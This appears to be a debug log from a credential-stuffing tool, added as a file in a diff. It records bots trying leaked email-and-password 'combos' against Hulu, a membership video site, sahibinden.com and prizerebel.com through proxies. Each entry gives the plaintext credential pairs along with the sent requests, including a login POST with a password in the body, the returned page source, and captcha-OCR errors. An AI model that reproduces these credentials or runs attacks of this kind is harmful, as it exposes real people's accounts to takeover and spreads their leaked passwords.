@@ -1,0 +1,531 @@
+Not relaunched BOT detected - Bot Status: 5
+-----------------------------------------------------------
+<----------------------------------------------------------------------------------
+Site: https://secure.hulu.com/account
+Debug of BOT 12
+Combo: lunetistul_matrix_2009@yahoo.com:alexutzu
+Proxy: 200.119.222.155
+----------------------------------------------------------------------------------
+<-----Bot Status: Calling main URL - Last status: Failure Source Keyword Match -> Found Key [Your login is invalid] - Source Length: 186----->
+<-----Sent Headers----->
+GET /account HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Host: secure.hulu.com
+Pragma: no-cache
+Connection: keep-alive
+
+<-----Socket Error: 430 - Timeout----->
+-----------------------------------------------------------
+Not relaunched BOT detected - Bot Status: 5
+-----------------------------------------------------------
+<----------------------------------------------------------------------------------
+Site: https://secure.hulu.com/account
+Debug of BOT 41
+Combo: jaffegriffen@yahoo.com:kortic1994
+Proxy: 200.119.222.155
+----------------------------------------------------------------------------------
+<-----Bot Status: Calling main URL - Last status: Failure Source Keyword Match -> Found Key [Your login is invalid] - Source Length: 186----->
+<-----Sent Headers----->
+GET /account HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Host: secure.hulu.com
+Pragma: no-cache
+Connection: keep-alive
+
+<-----Socket Error: 430 - Timeout----->
+-----------------------------------------------------------
+Not relaunched BOT detected - Bot Status: 5
+-----------------------------------------------------------
+<----------------------------------------------------------------------------------
+Site: https://secure.hulu.com/account
+Debug of BOT 68
+Combo: rapho_1987@hotmail.com:esperanza2
+Proxy: 200.119.222.155
+----------------------------------------------------------------------------------
+<-----Bot Status: Calling main URL - Last status: Failure Source Keyword Match -> Found Key [Your login is invalid] - Source Length: 186----->
+<-----Sent Headers----->
+GET /account HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Host: secure.hulu.com
+Pragma: no-cache
+Connection: keep-alive
+
+<-----Socket Error: 430 - Timeout----->
+-----------------------------------------------------------
+Not relaunched BOT detected - Bot Status: 5
+-----------------------------------------------------------
+<----------------------------------------------------------------------------------
+Site: https://secure.hulu.com/account
+Debug of BOT 80
+Combo: nismo765@hotmail.com:123456
+Proxy: 200.119.222.155
+----------------------------------------------------------------------------------
+<-----Bot Status: Calling main URL - Last status: Failure Source Keyword Match -> Found Key [Your login is invalid] - Source Length: 186----->
+<-----Sent Headers----->
+GET /account HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Host: secure.hulu.com
+Pragma: no-cache
+Connection: keep-alive
+
+<-----Socket Error: 430 - Timeout----->
+-----------------------------------------------------------
+Not relaunched BOT detected - Bot Status: 5
+-----------------------------------------------------------
+<----------------------------------------------------------------------------------
+Site: https://bluestarlive.net/access/login
+Debug of BOT 68
+Combo: snook1345:adamsnook
+Proxy: 82.223.29.137
+----------------------------------------------------------------------------------
+<-----Bot Status: Calling main URL - Last status: No keys found upon 200 - OK -> Check answer - Source Length: 1009----->
+<-----CONNECT Request----->
+CONNECT bluestarlive.net:443 HTTP/1.0
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: bluestarlive.net
+Proxy-Connection: Keep-Alive
+Content-Length: 0
+
+<-----CONNECT Response----->
+HTTP/1.1 200 Connection established
+
+
+<-----Bot Status: Calling main URL - Last status: No keys found upon 200 - OK -> Check answer - Source Length: 1009----->
+<-----Sent Headers----->
+GET /access/login HTTP/1.0
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: bluestarlive.net
+Pragma: no-cache
+Connection: keep-alive
+
+<-----Received Headers----->
+HTTP/1.0 200 OK
+Date: Sat, 13 May 2017 01:19:06 GMT
+Server: Apache
+Set-Cookie: PHPSESSID=u2qk52nlgpaa2o3sgpuspaer74; path=/; domain=.bluestarlive.net; HttpOnly
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+X-Pingback: https://bluestarlive.net/xmlrpc.php
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+<-----Received Source----->
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US" prefix="og: http://ogp.me/ns#">
+<![endif]-->
+<!--[if IE 7]>
+<html id="ie7" lang="en-US" prefix="og: http://ogp.me/ns#">
+<![endif]-->
+<!--[if IE 8]>
+<html id="ie8" lang="en-US" prefix="og: http://ogp.me/ns#">
+<![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
+<html lang="en-US" prefix="og: http://ogp.me/ns#">
+<!--<![endif]-->
+
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width" />
+<meta name="google-site-verification" content="0Ok18bZVYZ7NSPftkyaootsPx-lWMN62kA3sHz1luUw" />
+
+<title>Please login BlueStarLive | The Premier Modeling VlogSite</title>
+	
+	
+
+<link rel="stylesheet" type="text/css" media="all" href="https://bluestarlive.net/bsl/extend.css" />
+
+<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-16.png" sizes="16x16">
+<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96.png" sizes="96x96"> 
+<!-- For iPad with high-resolution Retina display running iOS ≥ 7: -->
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/assets/img/favicons/favicon-152.png">
+<!-- For iPad with high-resolution Retina display running iOS ≤ 6: -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/assets/img/favicons/favicon-144.png">
+<!-- For iPhone with high-resolution Retina display running iOS ≥ 7: -->
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/assets/img/favicons/favicon-120.png">
+<!-- For iPhone with high-resolution Retina display running iOS ≤ 6: -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/assets/img/favicons/favicon-114.png">
+<!-- For first- and second-generation iPad: -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/assets/img/favicons/favicon-72.png">
+<!-- For non-Retina iPhone, iPod Touch, and Android 2.1+ devices: -->
+<link rel="apple-touch-icon-precomposed" href="/assets/img/favicons/favicon-57.png">
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="object" />
+<meta property="og:title" content="BlueStarLive | The Premier Modeling VlogSite" />
+<meta property="og:description" content="BlueStarLive.net is the premier modeling VlogSite featuring vividly streaming HD video segments of the industry’s finest models. Register for free or signup today for full member access." />
+<meta property="og:url" content="https://bluestarlive.net" />
+<meta property="og:site_name" content="BlueStarLive | The Premier Modeling VlogSite" />
+
+<!-- This site is optimized with the Yoast SEO plugin v2.3.2 - https://yoast.com/wordpress/plugins/seo/ -->
+<!-- / Yoast SEO plugin. -->
+
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"https:\/\/bluestarlive.net\/lib\/js\/wp-emoji-release.min.js"}};
+			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='https://bluestarlive.net/tools/ff957fea/includes/css/styles.css' type='text/css' media='all' />
+<link rel='stylesheet' id='un_grid-css'  href='https://bluestarlive.net/bsl/extend/unsemantic-grid-responsive.css' type='text/css' media='all' />
+<link rel='stylesheet' id='un_tablet-css'  href='https://bluestarlive.net/bsl/extend/unsemantic-grid-responsive-tablet.css' type='text/css' media='all' />
+<link rel='stylesheet' id='esscss'  href='https://bluestarlive.net/tools/e98ffa87/assets/css/easy-social-share-buttons.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='style-style-css'  href='https://bluestarlive.net/bsl/extend.css' type='text/css' media='all' />
+<link rel='stylesheet' id='s2css'  href='https://bluestarlive.net/tools/d7c54d0d/s2member-o.php?ws_plugin__s2member_css=1&#038;qcABC=1' type='text/css' media='all' />
+<script type='text/javascript' src='https://bluestarlive.net/lib/js/jquery/jquery.js'></script>
+<script type='text/javascript' src='https://bluestarlive.net/lib/js/jquery/jquery-migrate.min.js'></script>
+<script type='text/javascript' src='https://bluestarlive.net/bsl/extend/enquire.js'></script>
+<script type='text/javascript' src='https://bluestarlive.net/bsl/extend/jquery.fittext.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var extend_connect = {"ajaxurl":"https:\/\/bluestarlive.net\/cloud"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://bluestarlive.net/bsl/extend/extend.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var bsl_connect = {"ajaxurl":"https:\/\/bluestarlive.net\/cloud"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://bluestarlive.net/bsl/extend/a7dehu209j.js'></script>
+<script>
+jQuery(document).ready(function($){
+    $('.am4-ajax-widget').each(function(){
+            $(this).load('https://bluestarlive.net/cloud', 
+            {
+                action: 'am4-show-widget',
+                id: $(this).attr('id')
+             });
+        });
+});
+</script> <script type="text/javascript">
+    var uv = {"logged":"yes","status":0,"current_page":null}  </script>
+
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+
+<script type="text/javascript">var essb_settings = {"ajax_url":"https:\/\/bluestarlive.net\/cloud","essb3_nonce":"d96ff88cc3","essb3_plugin_url":"https:\/\/bluestarlive.net\/src\/plugins\/easy-social-share-buttons3","essb3_facebook_total":true,"essb3_admin_ajax":false,"essb3_internal_counter":false,"essb3_stats":false,"essb3_ga":false,"essb3_ga_mode":"simple","essb3_counter_button_min":0,"essb3_counter_total_min":0,"blog_url":"https:\/\/bluestarlive.net\/","ajax_type":"wp","essb3_postfloat_stay":false,"essb3_no_counter_mailprint":false,"essb3_single_ajax":false,"twitter_counter":"self","post_id":false};</script><!-- userLayoutHead() start -->
+
+
+<link href="/access/application/default/views/public/css/amember.css" media="screen" rel="stylesheet" type="text/css" >
+<!--[if IE 7]> <link href="/access/application/default/views/public/css/ie-7.css" media="screen" rel="stylesheet" type="text/css" ><![endif]-->
+<link href="/access/application/default/views/public/js/jquery/jquery.ui.css" media="screen" rel="stylesheet" type="text/css" >
+
+<script type="text/javascript">
+    //<!--
+    if (typeof jQuery == 'undefined') {document.write('<script type="text/javascript" src="/access/application/default/views/public/js/jquery/jquery.js"></scr'+'ipt>');} else {$=jQuery;}    //-->
+</script>
+<script type="text/javascript">
+    //<!--
+    window.uiDefaultDate = new Date(2017,4,12);
+    //-->
+</script>
+<script type="text/javascript">
+    //<!--
+    window.uiDateFormat = "mm\/dd\/y";
+    //-->
+</script>
+<script type="text/javascript">
+    //<!--
+    window.rootUrl = "\/access";
+window.CKEDITOR_BASEPATH = "\/access\/application\/default\/views\/public\/js\/ckeditor\/";
+window.amLangCount = 0;
+    //-->
+</script>
+<script type="text/javascript" src="/access/application/default/views/public/js/jquery/jquery.ui.js"></script>
+<script type="text/javascript" src="/access/application/default/views/public/js/user.js"></script>
+<script type="text/javascript" src="/access/application/default/views/public/js/upload.js"></script>
+
+<!-- userLayoutHead() finish -->
+
+<!-- BEGIN GADWP v4.8.1.2 Universal Tracking - https://deconf.com/google-analytics-dashboard-wordpress/ -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-25458166-1', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- END GADWP Universal Tracking -->
+
+</head>
+
+<body class="">
+
+
+
+
+		
+<div id="deck">
+
+
+<div class="plat main_menu grid-100">
+	<div class="inner grid-100 grid-parent">
+		<div class="logo grid-10 mobile-grid-100"><div class="inner"></div></div>	
+        					
+			<div class="menu-header grid-90 hide-on-mobile thedesktop">
+				<ul id="public_desktop" class="menu">
+					<li class="menu-item models "><a href="/models">Models</a></li>
+					<li class="menu-item videos "><a href="/videos">Videos</a></li>
+					<li class="menu-item join "><a href="/access/signup">Join</a></li>
+					<li class="menu-item affiliates "><a href="/affiliates">Affiliates</a></li>
+					<li class="menu-item support "><a href="/support">Support</a></li>
+                    <li class="menu-item login "> <a href="/access">Login</a></li>
+				</ul>
+			</div>
+
+			<div class="menu-header mobile-grid-100 hide-on-desktop themobile">
+				<ul id="public_mobile" class="menu">				
+                	<li class="menu-item home "><a href="/">Home</a></li>
+                    <li class="menu-item login "> <a href="/access">Login</a></li>
+					<li class="menu-item models "><a href="/models">Models</a></li>
+					<li class="menu-item videos "><a href="/videos">Videos</a></li>
+					<li class="menu-item affiliates "><a href="/affiliates">Affiliates</a></li>
+					<li class="menu-item support "><a href="/support">Support</a></li>
+                    
+				</ul>
+			</div>			
+				
+	</div>
+</div> <!-- end header_menu -->
+<span class="l_canvas"></span>
+<div style="padding:0 1em;">
+<div class="am-body-content">
+                                        <h1>Please login </h1>
+        <!-- content starts here -->
+    <div class="am-login-form-wrapper" >
+        <div class="am-form am-login-form">
+        <form name="login" method="post" action='/access/login'>
+    <fieldset>
+        
+        <div class="row" id="recaptcha-row" style="display: none;"  data-recaptcha-theme="light" data-recaptcha-size="normal">
+            <div class="element am-element-recaptcha" id="recaptcha-element"></div>
+        </div>
+        <div class="row">
+            <div class="element-title">
+                <label class="element-title" for="amember-login">Username/Email</label>
+            </div>
+            <div class="element">
+                <input type="text" id="amember-login" name="amember_login" size="15" value="" autofocus  placeholder="Username" />
+            </div>
+        </div>
+        <div class="row">
+            <div class="element-title">
+                <label class="element-title" for="amember-pass">Password</label>
+            </div>
+            <div class="element">
+                <input type="password" id="amember-pass" name="amember_pass" class="am-pass-reveal" size="15" placeholder="Password" />
+                            </div>
+        </div>
+        <div class="row">
+            <div class="element">
+                <input type="submit" value="Login" /><br/>
+                <a style="padding-top:15px;" href="/access/login?sendpass" class="local-link am-form-login-switch">Forgot password?</a>
+            </div>
+        </div>
+    </fieldset>
+    <input type="hidden" name="login_attempt_id" value="1494638348" />
+</form>    </div>
+    </div>
+<div class="am-sendpass-form-wrapper" >
+    <div class="am-form am-sendpass-form">
+        <form name="sendpass" method="post" action="/access/sendpass">
+            <fieldset>
+                <legend>Lost password?</legend>
+                <div class="row">
+                    <div class="element-title">
+                        <label for="sendpass">Username/Email</label>
+                    </div>
+                    <div class="element"><input type="text" name="login" id="sendpass" size="15" placeholder="Username/Email" /></div>
+                </div>
+                <div class="row">
+                    <div class="element">
+                        <input type="submit" value="Get Password" />
+                        <a href="/access/login" class="local-link am-form-login-switch">Log In</a>
+                    </div>
+                </div>
+            </fieldset>
+        </form>
+    </div>
+</div>
+<script type="text/javascript">
+jQuery('.am-form-login-switch').click(function(){
+    jQuery('.am-login-form-wrapper, .am-sendpass-form-wrapper').toggle();
+    jQuery('.am-login-form-wrapper .errors, .am-sendpass-form-wrapper .errors, .am-body-content .errors').remove();
+    return false;
+});
+jQuery('.am-login-form-wrapper form, .am-sendpass-form-wrapper form').submit(function(){
+    jQuery('.am-body-content .errors').remove();
+});
+</script><div class="am-signup-link">Don't have a Membership yet? <a href="/access/signup">JOIN NOW</a></div>
+</div>
+<div id="am-flash" class="am-flash">
+    <div class="am-flash-mask"></div>
+    <div class="am-flash-content"></div>
+</div><p class="am-copyright">Built on <a href="http://www.amember.com/" title="flexible, user-friendly membership software (subscription script)">aMember Pro&trade; membership software</a></p>
+</div>
+
+
+</div><!-- #deck -->
+
+<div class="thefoot canvas">
+	<div class="thesocials">
+			<ul>
+				<li class="twitter"><a href="https://twitter.com/bluestarlive" target="_blank">Twitter</a></li>
+				<li class="instagram"><a href="http://instagram.com/bluestarlive" target="_blank">Instagram</a></li>
+				<li class="tumblr"><a href="http://bluestarlive.tumblr.com" target="_blank">Tumblr</a></li>
+				<li class="google"><a href="https://plus.google.com/+bluestarlivenet/posts" target="_blank">Google+</a></li>
+				<li class="wordpress"><a href="https://bluestarlive.wordpress.com" target="_blank">WordPress</a></li>
+			</ul>
+	</div>
+	
+	<div class="foot_menu">
+		<div class="menu-header-foot"><ul id="menu-foot_menu_public" class="menu"><li id="menu-item-1331" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1331"><a href="https://bluestarlive.net/terms/">Terms</a></li>
+<li id="menu-item-1329" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1329"><a href="https://bluestarlive.net/privacy/">Privacy</a></li>
+<li id="menu-item-1325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1325"><a href="https://bluestarlive.net/2257-compliance-notice/">2257</a></li>
+<li id="menu-item-1328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1328"><a href="https://bluestarlive.net/dmca/">DMCA</a></li>
+<li id="menu-item-2547" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2547"><a href="/access/signup">Join</a></li>
+<li id="menu-item-1326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1326"><a href="https://bluestarlive.net/affiliates/">Affiliates</a></li>
+<li id="menu-item-1327" class="contact menu-item menu-item-type-post_type menu-item-object-page menu-item-1327"><a href="https://bluestarlive.net/contact/">Contact</a></li>
+</ul></div>	</div> <!-- end header_menu -->
+	<div class="legal"><a href="/">BlueStarLive.Net</a> | All Rights Reserved.</div>
+	<div class="i5"><a href="/">BlueStarLive.Net</a><br>All Rights Reserved.</div>
+	<div class="siteseal grid-100 grid-parent">
+		<span id="siteseal">
+		<script type="text/javascript" src="https://sealserver.trustwave.com/seal.js?code=66a4dbf62d3d49d0bf6008ea30914af2"></script>
+		</span>
+		<span class="neatspace"></span>
+		<span id="rapidssl"><img src="/src/themes/bsl/img/RapidSSL_SEAL-90x50.gif"></span>
+	</div>
+</div>
+
+
+
+<script type='text/javascript' src='https://bluestarlive.net/tools/ff957fea/includes/js/jquery.form.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"https:\/\/bluestarlive.net\/tools\/ff957fea\/images\/ajax-loader.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://bluestarlive.net/tools/ff957fea/includes/js/scripts.js'></script>
+<script type='text/javascript' src='https://bluestarlive.net/tools/d7c54d0d/s2member-o.php?ws_plugin__s2member_js_w_globals=1&#038;qcABC=1'></script>
+<link rel="stylesheet" id="essb-cct-style"  href="https://bluestarlive.net/src/plugins/easy-social-share-buttons3/lib/modules/click-to-tweet/assets/css/styles.css" type="text/css" media="all" /><script type="text/javascript">var essb_window = function(oUrl, oService, oInstance) { var element = jQuery('.essb_'+oInstance); var instance_post_id = jQuery(element).attr("data-essb-postid") || ""; var instance_position = jQuery(element).attr("data-essb-position") || ""; var wnd; var w = 800 ; var h = 500; if (oService == "twitter") { w = 500; h= 300; } var left = (screen.width/2)-(w/2); var top = (screen.height/2)-(h/2); if (oService == "twitter") { wnd = window.open( oUrl, "essb_share_window", "height=300,width=500,resizable=1,scrollbars=yes,top="+top+",left="+left ); } else { wnd = window.open( oUrl, "essb_share_window", "height=500,width=800,resizable=1,scrollbars=yes,top="+top+",left="+left ); } if (typeof(essb_settings) != "undefined") { if (essb_settings.essb3_stats) { if (typeof(essb_handle_stats) != "undefined") { essb_handle_stats(oService, instance_post_id, oInstance); } } if (essb_settings.essb3_ga) { essb_ga_tracking(oService, oUrl, instance_position); } } essb_self_postcount(oService, instance_post_id); if (typeof(essb_abtesting_logger) != "undefined") { essb_abtesting_logger(oService, instance_post_id, oInstance); } var pollTimer = window.setInterval(function() { if (wnd.closed !== false) { window.clearInterval(pollTimer); essb_smart_onclose_events(oService, instance_post_id); } }, 200); }; var essb_self_postcount = function(oService, oCountID) { if (typeof(essb_settings) != "undefined") { oCountID = String(oCountID); jQuery.post(essb_settings.ajax_url, { 'action': 'essb_self_postcount', 'post_id': oCountID, 'service': oService, 'nonce': essb_settings.essb3_nonce }, function (data) { if (data) { }},'json'); } }; var essb_smart_onclose_events = function(oService, oPostID) { if (oService == "subscribe" || oService == "comments") return; if (typeof (essbasc_popup_show) == 'function') { essbasc_popup_show(); } if (typeof essb_acs_code == 'function') { essb_acs_code(oService, oPostID); } if (typeof(after_share_easyoptin) != "undefined") { essb_toggle_subscribe(after_share_easyoptin); } }; var essb_tracking_only = function(oUrl, oService, oInstance, oAfterShare) { var element = jQuery('.essb_'+oInstance); if (oUrl == "") { oUrl = document.URL; } var instance_post_id = jQuery(element).attr("data-essb-postid") || ""; var instance_position = jQuery(element).attr("data-essb-position") || ""; if (typeof(essb_settings) != "undefined") { if (essb_settings.essb3_stats) { if (typeof(essb_handle_stats) != "undefined") { essb_handle_stats(oService, instance_post_id, oInstance); } } if (essb_settings.essb3_ga) { essb_ga_tracking(oService, oUrl, instance_position); } } essb_self_postcount(oService, instance_post_id); if (oAfterShare) { essb_smart_onclose_events(oService, instance_post_id); } }; var essb_pinterest_picker = function(oInstance) { essb_tracking_only('', 'pinterest', oInstance); var e=document.createElement('script'); e.setAttribute('type','text/javascript'); e.setAttribute('charset','UTF-8'); e.setAttribute('src','//assets.pinterest.com/js/pinmarklet.js?r='+Math.random()*99999999);document.body.appendChild(e); };</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-25458166-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<img src='/access/cron' width='1' height='1'>
+</html>
+
+
+<-----Bot Status: Retrieved form data -> Authenticating----->
+<-----CONNECT Request----->
+CONNECT bluestarlive.net:443 HTTP/1.0
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: bluestarlive.net
+Proxy-Connection: Keep-Alive
+Content-Length: 0
+
+<-----CONNECT Response----->
+HTTP/1.1 200 Connection established
+
+
+<-----Bot Status: Retrieved form data -> Authenticating----->
+<-----Sent Headers----->
+POST /access/login HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: bluestarlive.net
+Pragma: no-cache
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Cookie: PHPSESSID=u2qk52nlgpaa2o3sgpuspaer74
+Post Data:
+amember_login=snook1345&amember_pass=adamsnook&login_attempt_id=1494638348
+
+<-----Received Headers----->
+HTTP/1.1 200 OK
+Date: Sat, 13 May 2017 01:19:15 GMT
+Server: Apache
+Content-Length: 1009
+Keep-Alive: timeout=10, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=utf-8
+
+<-----Received Source----->
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+    <head>
+        <title>Fatal Error</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <style type="text/css">
+        body {
+                background: #eee;
+                font: 80%/100% verdana, arial, helvetica, sans-serif;
+                text-align: center;
+        }
+        #container {
+            display: inline-block;
+            margin: 50px auto 0;
+            text-align: left;
+            border: 2px solid #f00;
+            background-color: #fdd;
+            padding: 10px 10px 10px 10px;
+            width: 60%;
+        }
+        h1 {
+            font-size: 12pt;
+            font-weight: bold;
+        }
+        </style>
+    </head>
+    <body>
+        <div id="container">
+            <h1>Script Error</h1>
+            Error establishing a database connection. Please contact site webmaster if this error does not disappear long time
+        </div>
+    </body>
+</html>
+
+----------------------------------------------------------------------------------
+<-----Bot Status: No keys found upon 200 - OK -> Check answer - Source Length: 1009----->
+---------------------------------------------------------------------------------->
+-----------------------------------------------------------
+Error in OCR Thread - Error Code: 2-4
+Image saved as JaZtidEKDWxqhFnLPN4X.bmp
+Error in BOT 21 for Site https://api.sahibinden.com/sahibinden-ral/rest/login -> Header received in status 5
+Error in BOT 4 for Site https://api.sahibinden.com/sahibinden-ral/rest/login -> Header received in status 5
+Error in BOT 15 for Site https://api.sahibinden.com/sahibinden-ral/rest/login -> Header received in status 5
+Error in BOT 21 for Site https://api.sahibinden.com/sahibinden-ral/rest/login -> Header received in status 1
+Error in BOT 4 for Site https://api.sahibinden.com/sahibinden-ral/rest/login -> Header received in status 1
+Error in BOT 15 for Site https://api.sahibinden.com/sahibinden-ral/rest/login -> Header received in status 1
+Error in BOT 42 for Site https://www.prizerebel.com/ -> Header received in status 5
+Error in BOT 42 for Site https://www.prizerebel.com/ -> Header received in status 5
